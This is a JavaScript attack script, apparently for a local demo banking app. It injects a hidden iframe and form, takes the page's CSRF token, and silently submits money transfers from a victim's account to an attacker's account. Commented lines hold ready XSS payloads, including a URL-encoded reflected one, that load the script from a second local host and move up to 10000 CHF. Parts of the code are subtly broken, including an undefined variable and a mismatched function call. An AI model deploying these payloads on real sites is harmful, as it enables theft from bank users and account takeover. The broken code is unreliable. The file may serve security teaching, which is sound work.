function transferCSRF(formname, fromAccount, toAccount, amount, currency) {
    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://localhost:8080/doTransfer");
    document.getElementById(formname).submit();
}

function transfer(formname, fromAccount, toAccount, amount, currency, action) {
    if (addTransferForm(formname, fromAccount, toAccount, amount, currency, "/doTransfer")) {
        var submitFunction = function () {
            submitTransferForm(formname, fromAccount);
        };
        document.body.onload = submitFunction;
    }
}

function addTransferForm(formname, fromAccount, toAccount, amount, currency, action) {
    if (!document.getElementById("hiddenFrame")) {
        var ifr = document.createElement("iframe");
        ifr.name = "hiddenFrame";
        ifr.style = "display:none";
        document.body.appendChild(ifr);
    }
    if (!formname) {
        formname = generateId(10);
    }
    if (!document.getElementById(formname)) {
        var form = createHiddenForm(formname, "hiddenFrame")
        createHiddenInput(form, "fromAccount", fromAccount);
        createHiddenInput(form, "toAccount", toAccount);
        createHiddenInput(form, "amount", amount);
        createHiddenInput(form, "currency", currency);
        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>');
        var csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
        if (csrfToken) {
            createHiddenInput(document, form, "_csrf", csrfToken);
        }
        return true;
    }
    return false;
}

function createHiddenForm(formname, target) {
    var form = document.createElement("form");
    form.action = action;
    form.method = "post";
    form.target = target;
    form.id = formname;
    form.style = "display:none";
    form.style.visible = false;
    document.body.appendChild(form);
    return form;
}

function createHiddenInput(form, name, value) {
    var input = document.createElement("input");
    input.name = name;
    input.type = "hidden";
    input.value = value;
    form.appendChild(input);
    return input;
}

function submitTransferForm(formname, fromAccount) {
    var isAccOwner = document.getElementById("header").textContent.indexOf(fromAccount) >= 0;
    var alreadyDone = document.getElementById("note_" + formname);
    if (isAccOwner && !alreadyDone) {
        console.log("Submitting : " + formname);
        document.getElementById(formname).submit();
    } else {
        console.log("NOT submitting : " + formname);
    }
}

//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob1","1-987654-1","2-542397-2","100","CHF")</script>
//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob2","1-987654-1","2-542397-2","10000","CHF")</script>
//http://localhost:8080/history?accountNo=1-987654-1%27+--+%3Cscript+src=%22http://localhost:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-987654-1%22,%222-542397-2%22,%22800%22,%22CHF%22)%3C/script%3E

// dec2hex :: Integer -> String
function dec2hex (dec) {
    return ('0' + dec.toString(16)).substr(-2)
}

// generateId :: Integer -> String
function generateId (len) {
    var arr = new Uint8Array((len || 40) / 2)
    window.crypto.getRandomValues(arr)
    return Array.from(arr, dec2hex).join('')
}